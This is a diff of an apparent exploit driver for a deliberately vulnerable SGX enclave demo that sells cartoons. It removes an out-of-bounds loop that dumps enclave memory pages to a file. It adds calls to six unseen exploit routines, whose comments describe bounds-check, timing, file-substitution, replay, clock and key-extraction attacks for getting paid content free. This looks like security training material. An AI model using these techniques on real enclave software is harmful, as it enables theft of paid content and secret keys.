@@ -22,17 +22,16 @@
 #include "stdafx.h"
 #include <stdio.h>
 #include <stdlib.h>
-#include "SGXware.h"
 
-#include "sgx_urts.h"
-#include "sgx_uae_service.h"
-#include "DVSE_u.h"
+#include "exploits.h"
 
 void Usage(char* appname)
 {
 	printf("\nUsage: %s library_folder server_ip port\n", appname);
 }
+
 extern sgx_enclave_id_t global_eid;
+
 int main(int argc, char ** argv)
 {
 	if (argc < 4)
@@ -55,38 +54,32 @@ int main(int argc, char ** argv)
 		wprintf(L"WSAStartup failed: %d\n", iResult);
 		return 1;
 	}
-
-
-	if (!SGXware::getInstance()->initUser(server_ip, iport, library_folder))
-	{
-		printf("\n Can not initialize enclave, exiting ...\n");
-		exit(2);
-	}
-
-	int page_shift = 20;
-	char filename[1024];
-	snprintf(filename, 1024, "%s\\dumped_pages.bin", library_folder);
-	FILE* pages = fopen(filename, "wb");
-	if (!pages)
-	{
-		printf("\n Can not open dump file, exiting ...\n");
-		exit(2);
-	}
-
 	
-	for (int i = -page_shift; i < page_shift; i++)
-	{
-		unsigned char page[1024];
-		memset(page, 0, 1024);
-		sgx_status_t ret;
-		int res;
-
-		ret = ecall_get_epg_page(global_eid, &res, i, 1024, page);
-
-		fwrite(page, 1, 1024, pages);
-		
-	}
-	fclose(pages);
+	// exploit the bug of missing boundary checks in reading EPG
+	// this allows to get the coupons for viewing cartoons where payment is required
+	e0_exfiltrate_data	(server_ip, iport, library_folder);
+	// exploit using strcmp for coupon comparison
+	// this allows to get the coupons for viewing cartoons where payment is required
+	e1_timing_attack	(server_ip, iport, library_folder);
+	// exploit trusting fopen too much
+	// this allows to extract any payed cartoon
+	// when encklave thinks that it works with free one
+	e2_file_substitution(server_ip, iport, library_folder);
+	// exploit missing replay protection on the blob file
+	// by claiming already known coupons, storing the blob aside, 
+	// getting the movie, and returning the coupon back 
+	e3_blob_reuse		(server_ip, iport, library_folder);
+	// exploit trusting OS time too much
+	// this allows to extract any already payed cartoon by any time
+	// by returning the time close to the payment from the OS
+	e4_time_substitution(server_ip, iport, library_folder);
+	// exploit key material exaustion, substituted as 
+	// mistake in random number generation type miscast,
+	// encrypted log left by very unfortunate typo, and 
+	// downloading the files before it is determined if 
+	// user already payed for this.
+	// This allows to decrypt any movie
+	e5_crypto_extraction(server_ip, iport, library_folder);
 
     return 0;
 }
